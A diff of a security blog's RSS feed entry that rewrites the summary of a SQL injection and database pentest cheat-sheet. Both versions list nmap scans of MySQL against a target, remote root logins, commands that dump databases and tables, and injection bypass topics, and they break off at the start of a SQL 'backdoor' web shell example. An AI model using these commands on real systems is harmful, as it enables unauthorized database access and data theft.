@@ -14,7 +14,7 @@
       <pubDate>Tue, 08 Jun 2021 00:00:00 +0000</pubDate>
       
       <guid>https://tranquac.github.io/posts/2021/06/sql/</guid>
-      <description>General  MySQL (3306) MSSQL (1433) Oracle (1521) PostgresSQL (5432)   SQL Injection  Google Dorking Bad character detect Detect number of vulnerable columns Union Select bypass usando comentarios bypass usando comentarios and url encoding Information_schema.tables bypass concat group_concat Authen bypass   SQLMAP Reference  General MySQL-3306 Nmap nmap -Pn -sV -p 3306 --script mysql* TARGETIP Access Remotely: mysql -host=TARGETIP -u root -p mysql -u root -p password -e &amp;#39;show databases;&amp;#39; mysql -u root -p password DBNAME -e &amp;#39;select * from TABLENAME;&amp;#39; Access Locally: mysql -u root -p mysql&amp;gt; use DBNAME; mysql&amp;gt; show tables; Command Backdoor example: SELECT &amp;#34;&amp;lt;?</description>
+      <description>General  MySQL (3306) MSSQL (1433) Oracle (1521) PostgresSQL (5432)   SQL Injection  Bad character detect Authen bypass Sql injection bypass filter   SQLMAP Reference  General MySQL-3306 Nmap nmap -Pn -sV -p 3306 --script mysql* TARGETIP Access Remotely: mysql -host=TARGETIP -u root -p mysql -u root -p password -e &amp;#39;show databases;&amp;#39; mysql -u root -p password DBNAME -e &amp;#39;select * from TABLENAME;&amp;#39; Access Locally: mysql -u root -p mysql&amp;gt; use DBNAME; mysql&amp;gt; show tables; Command Backdoor example: SELECT &amp;#34;&amp;lt;?</description>
     </item>
     
     <item>
